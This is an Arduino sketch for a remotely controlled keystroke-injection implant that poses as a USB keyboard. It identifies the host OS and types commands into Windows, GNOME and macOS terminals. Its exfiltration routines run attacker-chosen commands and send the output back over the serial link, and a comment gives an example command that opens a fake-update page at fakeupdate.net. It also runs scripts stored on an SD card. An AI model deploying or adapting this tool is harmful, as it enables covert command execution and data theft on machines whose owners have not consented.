#include <Keyboard.h>
#include <SPI.h>
#include <SD.h>
#include <FingerprintUSBHost.h>

char Command[255];
String cmd;
String SDdata;
String os;
String tmp_key;
int key;

File myFile;

void setup() {
  // put your setup code here, to run once:
  //Start up the ESP 8266
  pinMode(13, OUTPUT);
  digitalWrite(13, HIGH);

  Serial.begin(115200);
  Serial1.begin(115200);
  Keyboard.begin();
  delay(1000);
  FingerprintUSBHost.guessHostOS(os);
  delay(1000);

  if (!SD.begin(4)) {
    Serial.println(F("SD not found"));
  }
}

char ProcessCommand() {
  delay(1500);

  // Runwin (example: runwin iexplore -k http://fakeupdate.net/wnc/)
  if(cmd.startsWith("runwin ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print(Command + 7);
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
  }

  // Rungnome (example: rungnome touch helloworld.txt)
  else if(cmd.startsWith("runnix ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    delay(1000);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F2);
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print(F("gnome-terminal"));
    delay(200);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(2000);
    Keyboard.print(Command + 7);
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
  }

  // Runmac (example: runmac Terminal)
  else if(cmd.startsWith("runmac ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    delay(1000);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(' ');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print(Command + 7);
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
  }

  // GetOS (example: getOS)
  else if(cmd.startsWith("getOS")) {
    Serial1.print("OS: ");
    Serial1.println(os);
  }

  // Delay (example: delay 2000)
  else if(cmd.startsWith("delay ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    delay(atoi(Command + 6));
  }

  // ExfilWin (example: exfilWin whoami)
  else if(cmd.startsWith("exfilWin ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print(F("powershell"));
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(5000);
    Keyboard.print(F("$a=[System.IO.Ports.SerialPort]::getportnames();$attack="));
    delay(300);
    Keyboard.print(Command + 9);
    delay(300);
    Keyboard.println(F(";$port=new-Object System.IO.Ports.SerialPort $a,115200,None,8,one;$port.open();$port.WriteLine(\"ExfilWin:$attack\");$port.close();exit;"));
  }

  // ExfilGnome (example: exfilNix whoami)
  else if(cmd.startsWith("exfilNix ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F2);
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print(F("gnome-terminal"));
    delay(200);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(3000);
    Keyboard.print(F("sleep .5;stty -F /dev/serial/by-id/*Leonardo* 115200;echo -e \"ExfilNix:\"$("));
    delay(300);
    Keyboard.print(Command + 9);
    delay(300);
    Keyboard.print(F(")\"\" > /dev/serial/by-id/*Leonardo*"));
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
  }

  // ExfilMac (example: exfilMac whoami)
  else if(cmd.startsWith("exfilMac ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(' ');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print(F("Terminal"));
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(3000);
    Keyboard.print(F("sleep .5;stty -F /dev/cu.usbmodemHID* 115200;echo -e \"ExfilMac:\"$("));
    delay(300);
    Keyboard.print(Command + 9);
    delay(300);
    Keyboard.print(F(")\"\" > /dev/cu.usbmodemHID*"));
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
  }

  // Release (example: release)
  else if(cmd.startsWith("release")) {
    Keyboard.releaseAll();
  }

  // Println (example: println Hello World)
  else if(cmd.startsWith("println ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.println(Command + 8);
  }

  // Print (example: print Hello World)
  else if(cmd.startsWith("print ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.print(Command + 6);
  }

  // Press (example: press 131) 131 = KEY_LEFT_GUI
  else if(cmd.startsWith("press ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    tmp_key = Command + 6;
    key = tmp_key.toInt();
    Keyboard.press(key);
    delay(100);
  }
  
  // RawPress (example: rawpress 131) 131 = KEY_LEFT_GUI
  else if(cmd.startsWith("rawpress ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    tmp_key = Command + 9;
    key = tmp_key.toInt();
    Keyboard.press(key);
    delay(100);
    Keyboard.releaseAll();
  }

  // ExecSD (example: execSD [name.txt] -- execSD test.txt, execSD helloworld.txt, execSD remote.txt, etc)
  else if(cmd.startsWith("execSD ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    myFile = SD.open(Command + 7);
    delay(500);
    while (myFile.available()) {
    cmd = myFile.readStringUntil('\n');
    ProcessCommand();
    }
    // Close the file
    myFile.close();
  }
}

void loop() {
  // put your main code here, to run repeatedly:
  while (Serial1.available()) {
    cmd = Serial1.readStringUntil('\n');
    delay(500);
    ProcessCommand();
  }

  while (Serial.available()) {
    String airgap = Serial.readString();
    Serial1.println(airgap);
  }
}
